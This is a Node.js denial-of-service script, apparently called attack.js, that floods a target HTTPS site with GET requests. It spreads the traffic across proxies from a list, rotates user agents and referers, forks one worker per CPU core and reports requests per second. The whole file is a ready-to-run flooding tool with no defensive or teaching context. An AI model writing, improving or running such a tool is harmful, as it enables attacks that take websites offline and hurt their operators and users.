const fs = require('fs');
const tls = require('tls');
const net = require('net');
const url = require('url');
const cluster = require('cluster');
const os = require('os');

const proxies = fs.existsSync('proxy.txt') ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean) 
              : fs.existsSync('proxies.txt') ? fs.readFileSync('proxies.txt', 'utf-8').split('\n').filter(Boolean)
              : [];

const userAgents = fs.existsSync('ua.txt') ? fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean)
                : [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                    'Mozilla/5.0 (X11; Linux x86_64)',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)',
                    'Mozilla/5.0 (Linux; Android 11; Mobile)'
                ];

const referers = fs.existsSync('refs.txt') ? fs.readFileSync('refs.txt', 'utf-8').split('\n').filter(Boolean)
                : ['https://google.com'];

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

if (!target || !duration) {
    console.log('Usage: node attack.js [target] [duration]');
    process.exit(1);
}

if (proxies.length === 0) {
    console.error('No proxies found!');
    process.exit(1);
}

const numCPUs = os.cpus().length;

const parsed = url.parse(target);
const targetHost = parsed.hostname;
const targetPort = parsed.port || 443;
const targetPath = parsed.path || '/';

let totalRequests = 0;
let successRequests = 0;
let failedRequests = 0;
let currentRps = 0;
let peakRps = 0;

// Random helper
function randomItem(list) {
    return list[Math.floor(Math.random() * list.length)];
}

function sendRequest() {
    const proxy = randomItem(proxies).trim();
    const userAgent = randomItem(userAgents);
    const referer = randomItem(referers);

    const [proxyHost, proxyPort] = proxy.split(':');

    const socket = net.connect(proxyPort, proxyHost, () => {
        socket.write(`CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n`);
    });

    socket.on('data', (chunk) => {
        if (chunk.toString().indexOf('200') !== -1) {
            const tlsConnection = tls.connect({
                socket: socket,
                servername: targetHost,
                rejectUnauthorized: false
            }, () => {
                const req = 
`GET ${targetPath} HTTP/1.1\r
Host: ${targetHost}\r
User-Agent: ${userAgent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.9\r
Referer: ${referer}\r
Connection: Keep-Alive\r
\r
`;
                tlsConnection.write(req);
            });

            tlsConnection.on('data', () => {
                totalRequests++;
                successRequests++;
                currentRps++;
                tlsConnection.destroy();
                sendRequest();
            });

            tlsConnection.on('error', () => {
                totalRequests++;
                failedRequests++;
                sendRequest();
            });

        } else {
            socket.destroy();
            totalRequests++;
            failedRequests++;
            sendRequest();
        }
    });

    socket.on('error', () => {
        socket.destroy();
        totalRequests++;
        failedRequests++;
        sendRequest();
    });
}

if (cluster.isMaster) {
    console.log(`\nFlooding Target: ${target}`);
    console.log(`Using ${numCPUs} Threads and ${proxies.length} Proxies.`);
    console.log(`\nStarted Attack...\n`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setInterval(() => {
        if (currentRps > peakRps) {
            peakRps = currentRps;
        }
        console.log(`Total Requests: ${totalRequests} | RPS: ${currentRps}`);
        currentRps = 0;
    }, 1000);

    setTimeout(() => {
        console.log('\nAttack Finished.');
        console.log(`Peak RPS: ${peakRps}`);
        console.log(`SUCCESS: ${successRequests}`);
        console.log(`FAILED: ${failedRequests}`);
        process.exit(0);
    }, duration * 1000);

} else {
    while (true) {
        sendRequest();
    }
}
